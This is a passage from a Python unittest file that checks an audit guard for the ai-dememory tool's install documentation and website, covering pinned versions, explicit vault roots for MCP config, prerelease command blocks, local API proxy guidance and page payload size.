                self.assertTrue(any("internal Python CLI API" in error for error in errors))

        self.assertEqual(
            [],
            _stable_command_errors(
                "python3 -m compileall -q scripts mcp/server ai_dememory_tool",
                "2.1.0",
                "fixture",
            ),
        )

    def test_profile_guide_requires_an_explicit_vault_root_for_every_mcp_config(self) -> None:
        without_root = "ai-dememory mcp-config --client codex"
        errors = _stable_command_errors(
            without_root,
            "2.1.0",
            "fixture",
            require_explicit_mcp_root=True,
        )
        self.assertTrue(any("explicit vault" in error for error in errors))

        with_root = "ai-dememory --root ~/code/my-memory mcp-config --client codex"
        self.assertEqual(
            [],
            _stable_command_errors(
                with_root,
                "2.1.0",
                "fixture",
                require_explicit_mcp_root=True,
            ),
        )

        rejected_overrides = (
            (
                "ai-dememory --root safe mcp-config --root evil --client codex"
            ),
            (
                "ai-dememory --root=safe mcp-config --root=evil --client codex"
            ),
            (
                "ai-dememory mcp-config --root safe --client codex"
            ),
        )
        for command in rejected_overrides:
            with self.subTest(command=command):
                errors = _stable_command_errors(
                    command,
                    "2.1.0",
                    "fixture",
                    require_explicit_mcp_root=True,
                )
                self.assertTrue(any("no later override" in error for error in errors))

    def test_guard_allows_explicit_source_checkout_install_forms(self) -> None:
        source_commands = """pipx install .
python3 -m pip install -e .
"""
        self.assertEqual(
            [],
            _stable_command_errors(source_commands, "2.1.0", "source fixture"),
        )

    def test_guard_rejects_a_persistent_version_gate_on_the_published_stable_line(self) -> None:
        errors = _stable_command_errors(
            "ai-dememory init ~/code/my-memory --wizard --require-version 2.1.1",
            "2.1.1",
            "fixture",
            source_version="2.1.1",
        )
        self.assertTrue(
            any("must not retain a persistent --require-version gate" in error for error in errors),
            errors,
        )

    def test_future_pending_contract_preserves_unpinned_wizard_guidance(self) -> None:
        with self._future_pending_contract():
            self.assertEqual(
                [],
                _stable_command_errors(
                    "ai-dememory init ~/code/my-memory --wizard",
                    "2.1.1",
                    "fixture",
                    source_version=FUTURE_PENDING_VERSION,
                ),
            )
            errors = _stable_command_errors(
                "ai-dememory init ~/code/my-memory --wizard --require-version 2.1.1",
                "2.1.1",
                "fixture",
                source_version=FUTURE_PENDING_VERSION,
            )
        self.assertTrue(
            any(
                "release-pending public documentation must not pass --require-version" in error
                for error in errors
            ),
            errors,
        )

    def test_guard_rejects_persistent_version_gates_in_the_stable_site(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            install = copied / "install" / "index.html"
            install.write_text(
                install.read_text(encoding="utf-8").replace(
                    "ai-dememory init ~/code/my-memory --wizard",
                    "ai-dememory init ~/code/my-memory --wizard --require-version 2.1.1",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    error.startswith("site/install/index.html:")
                    and "release-pending public documentation must not pass --require-version"
                    in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_a_historical_prerelease_command_block(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            install = copied / "install" / "index.html"
            install.write_text(
                install.read_text(encoding="utf-8").replace(
                    "</main>",
                    """<div class=\"code-block\" data-copy-block data-release=\"source-2.1.1rc2\"><pre tabindex=\"0\"><code>python -m pip install --index-url https://test.pypi.org/simple/ ai-dememory==2.1.1rc2
ai-dememory init ~/code/my-memory --wizard</code></pre></div></main>""",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "unknown release marker 'source-2.1.1rc2'"
                    in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_resource_profile_drift(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            install = copied / "install/index.html"
            install.write_text(
                install.read_text(encoding="utf-8").replace("Up to 1,200 tokens", "Up to 1,500 tokens", 1),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("resource profile 'balanced'" in error for error in errors))

    def test_install_commands_remain_available_without_javascript(self) -> None:
        install = (SITE_ROOT / "install/index.html").read_text(encoding="utf-8")
        self.assertIn("pipx install ai-dememory", install)
        self.assertIn("uv tool install ai-dememory", install)
        self.assertIn("pipx install --force ai-dememory", install)
        self.assertIn(
            "ai-dememory init ~/code/my-memory --wizard",
            install,
        )
        self.assertNotIn("--require-version", install)
        self.assertNotIn("ai-dememory==", install)
        self.assertIn("ai-dememory --root ~/code/my-memory mcp-config --client codex", install)
        self.assertNotIn(
            "python -m pip install --index-url https://test.pypi.org/simple/ ai-dememory==2.1.1rc2",
            install,
        )
        self.assertNotIn('data-release="source-2.1.1rc2"', install)
        self.assertIn('data-release="published-2.1.1"', install)
        self.assertIn("Stable release: 2.1.1", install)
        self.assertNotIn('class="copy-button"', install)
        self.assertIn("document.createElement(\"button\")", (SITE_ROOT / "assets/site.js").read_text(encoding="utf-8"))

    def test_local_api_guide_sets_the_supported_browser_proxy_boundary(self) -> None:
        guide = " ".join(
            (REPO_ROOT / "docs" / "local-api.md").read_text(encoding="utf-8").split()
        )

        self.assertIn(
            "browser page served from another origin cannot call it directly",
            guide,
        )
        self.assertIn(
            "same-origin reverse proxy only when it keeps a loopback `Host` "
            "(`127.0.0.1` or `localhost`) and forwards a matching `Origin`",
            guide,
        )
        self.assertIn(
            "does not configure or support that proxy or its browser-auth design",
            guide,
        )
        self.assertIn("For the normal path, use a native/local script instead.", guide)
        self.assertNotIn("same-origin local UI", guide)
        self.assertNotIn("browser UI integration is not currently supported", guide)
        self.assertNotIn("conventional reverse proxy does not bypass", guide)

    def test_development_status_does_not_freeze_a_moving_main_sha(self) -> None:
        status = (REPO_ROOT / "docs" / "development-status.md").read_text(
            encoding="utf-8"
        )

        self.assertIn("Public `main` is a moving source branch", status)
        self.assertIn("git ls-remote origin refs/heads/main", status)
        self.assertNotIn("- Public `main`:\n  `", status)

    def test_development_status_retains_rc2_as_historical_release_evidence(self) -> None:
        status = (REPO_ROOT / "docs" / "development-status.md").read_text(
            encoding="utf-8"
        )

        historical = HISTORICAL_PRERELEASE_CONTRACTS["2.1.1rc2"]
        for evidence in historical["status_evidence"]:
            with self.subTest(evidence=evidence):
                self.assertIn(evidence, status)
        self.assertIn(historical["status_marker"], status.casefold())
        self.assertNotRegex(
            status.casefold(),
            r"(?s)\b2\.1\.1rc2\b.{0,120}\b(?:is|remains)\s+(?:the\s+)?(?:current|active)\b",
        )

    def test_clipboard_fallback_selects_commands_and_updates_accessible_status(self) -> None:
        javascript = (SITE_ROOT / "assets/site.js").read_text(encoding="utf-8")
        self.assertIn("document.createRange()", javascript)
        self.assertIn("range.selectNodeContents(code)", javascript)
        self.assertIn("Clipboard unavailable; commands selected", javascript)
        self.assertIn("Clipboard unavailable; select commands manually", javascript)

    def test_home_payload_stays_below_documented_budget(self) -> None:
        total = sum(
            path.stat().st_size
            for path in (
                SITE_ROOT / "index.html",
                SITE_ROOT / "assets/site.css",
                SITE_ROOT / "assets/site.js",
            )
        )
        self.assertLessEqual(total, 250 * 1024)


if __name__ == "__main__":
    unittest.main()
